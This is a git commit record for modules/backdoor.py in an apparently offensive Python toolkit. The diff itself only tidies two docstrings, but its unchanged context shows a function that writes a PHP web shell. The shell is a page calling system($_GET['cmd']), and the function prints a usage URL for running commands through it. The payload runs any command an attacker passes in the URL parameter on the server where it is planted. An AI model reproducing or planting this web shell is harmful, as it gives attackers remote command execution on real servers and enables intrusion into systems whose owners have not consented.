f91b166b264898b4d2913fe5bb979ba9b4bc4c96
3XPL017 <eclipse0010101@gmail.com>
2018-05-19 16:56:06 -0500

    Update backdoor.py

--- modules/backdoor.py
+++ modules/backdoor.py
@@ -1,11 +1,11 @@
 #!/usr/bin/python
-"""backdoor module"""
+"""backdoor module."""
 
 from termcolor import colored
 
 
 def php_backdoor():
-    """Creates a backdoor in php"""
+    """Create a backdoor in php."""
     print colored('Creating backdoor.php', 'green')
     print colored('Usage: http://<localIP>/backdoor.php?cmd=', 'green')
     code = "<html> <?php system($_GET['cmd']);?> </html>"
